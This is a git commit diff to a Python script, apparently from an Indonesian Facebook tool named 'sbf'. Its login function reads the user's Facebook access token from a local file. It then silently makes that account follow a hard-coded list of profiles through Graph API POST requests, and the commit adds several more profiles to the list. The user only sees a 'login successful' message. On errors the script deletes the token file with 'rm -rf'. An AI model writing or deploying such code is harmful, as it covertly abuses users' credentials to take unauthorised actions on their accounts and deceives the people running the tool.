7051bc723dfb24917ac496dac9e69cdc15ebb069
Alpha <85695679+Fahim-XD@users.noreply.github.com>
2021-12-10 12:39:11 +0600

    Add files via upload

--- bot_follow_sbf.py
+++ bot_follow_sbf.py
@@ -1,11 +1,13 @@
 import requests,os,json,sbf
 
-def main():
+def main(__cici__):
     try:
         token = open("token.txt","r").read()
         requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
         requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
+        requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
         requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
+        requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
         requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
         requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
         requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
@@ -20,14 +22,18 @@ def main():
         requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
         requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
         requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
+        requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
         requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
+        requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
+        requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
+        requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
         print('\n[•] Login Berhasil')
-        exit(sbf.menu())
+        exit(sbf.menu(__cici__))
     except (KeyError,IOError):
         print('\n[!] Token Invalid')
         os.system('rm -rf token.txt')
-        exit(sbf.login())
+        exit(sbf.login(__cici__))
     except requests.exceptions.ConnectionError:
         print('\n[!] Koneksi Bermasalah')
         os.system('rm -rf token.txt')
-        exit(sbf.login())
+        exit(sbf.login(__cici__))
